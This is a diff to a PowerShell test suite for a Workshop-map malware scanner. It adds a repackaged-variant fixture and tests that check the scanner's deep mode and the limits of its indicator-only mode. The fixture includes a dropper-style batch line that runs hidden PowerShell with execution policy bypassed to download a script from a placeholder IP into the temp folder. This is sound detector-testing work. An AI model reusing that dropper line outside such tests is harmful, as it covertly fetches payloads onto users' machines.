@@ -96,6 +96,34 @@ New-Item -ItemType Directory -Path "$Clean\home\Startup"   -Force | Out-Null
 Set-Content -LiteralPath "$Clean\steamroot\steamapps\workshop\content\$AppId\2222222222\nice.pak" `
             -Value 'a completely normal community map'
 
+# -------------------------------------------------------------- variant tree
+#
+# A repackaged copy of the same malware: different Workshop ID, different file
+# contents, different server. Every published indicator misses it. This is the
+# case -Deep exists for, and the realistic one -- replacement maps appeared
+# within hours of each takedown.
+
+$Var = Join-Path $Fix 'variant'
+$VWs = Join-Path $Var "steamroot\steamapps\workshop\content\$AppId\4242424242"
+New-Item -ItemType Directory -Path $VWs -Force | Out-Null
+New-Item -ItemType Directory -Path "$Var\home\Documents" -Force | Out-Null
+New-Item -ItemType Directory -Path "$Var\home\Startup"   -Force | Out-Null
+
+# Same dropper behaviour, none of the known strings.
+Set-Content -LiteralPath "$Var\home\Documents\update_helper.bat" -Value @(
+    '@echo off',
+    'if not defined _Q set _Q=1 & start /min cmd /c %~f0 & exit',
+    'powershell -w hidden -ep bypass -c iwr http://198.51.100.77/x/p.bat -OutFile %TEMP%\p.bat',
+    'echo inert test fixture'
+)
+
+# A map reaching for capability it has no business having.
+$vbytes = [byte[]]@() `
+    + [System.Text.Encoding]::ASCII.GetBytes('PAKFILEHEADER') `
+    + [System.Text.Encoding]::Unicode.GetBytes('GetPlatformUserDir') `
+    + [System.Text.Encoding]::ASCII.GetBytes('SaveStringToFilePADDING')
+[System.IO.File]::WriteAllBytes("$VWs\newmap.pak", $vbytes)
+
 # ------------------------------------------------------------------ run them
 
 Write-Host ''
@@ -129,6 +157,36 @@ Write-Host ''
 Check ($OutClean -match 'No known indicators of this malware were found') 'reports nothing found'
 Check ($OutClean -match 'not proof that you are clean')                   "keeps the 'not proof you are clean' caveat"
 Check ($RcClean -eq 0)                                                    "exit code 0 when nothing found (got $RcClean)"
+
+# --------------------------------------- repackaged variant, -Deep vs not
+
+Write-Host ''
+Write-Host '  Repackaged variant (new ID, new hash, new server)'
+Write-Host '  -------------------------------------------------'
+
+$RealIoc = Join-Path $Repo 'indicators.json'
+$OutVarIoc = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
+                 -ScanRoot $Var -Indicators $RealIoc -NoColor 2>&1 | Out-String
+$RcVarIoc = $LASTEXITCODE
+$OutVarDeep = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
+                 -ScanRoot $Var -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-String
+$RcVarDeep = $LASTEXITCODE
+
+# This is the honest limitation, asserted rather than hand-waved: without
+# -Deep, a repackaged copy is invisible.
+Check ($OutVarIoc -match 'No known indicators of this malware were found') 'IOC-only mode misses the variant (documents the limitation)'
+Check ($RcVarIoc -eq 0)                                                    "IOC-only exits 0 on the variant (got $RcVarIoc)"
+Check ($OutVarDeep -match 'behaves like this malware')                     '-Deep catches the dropper pattern'
+Check ($OutVarDeep -match 'launch programs, which maps do not need')       '-Deep catches Unreal capability abuse'
+Check ($OutVarDeep -match 'worth a look')                                  '-Deep wording avoids claiming infection'
+Check ($OutVarDeep -match 'Do not panic')                                  '-Deep tells the user most hits are false alarms'
+Check ($RcVarDeep -eq 3)                                                   "-Deep exits 3 for behaviour-only hits (got $RcVarDeep)"
+
+# The clean tree must stay clean even in deep mode -- otherwise the flag is
+# useless noise.
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
+    -ScanRoot $Clean -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-Null
+Check ($LASTEXITCODE -eq 0) "-Deep stays quiet on a clean system (got $LASTEXITCODE)"
 
 # ---------------------------------------------- refuses to run without IOCs
 
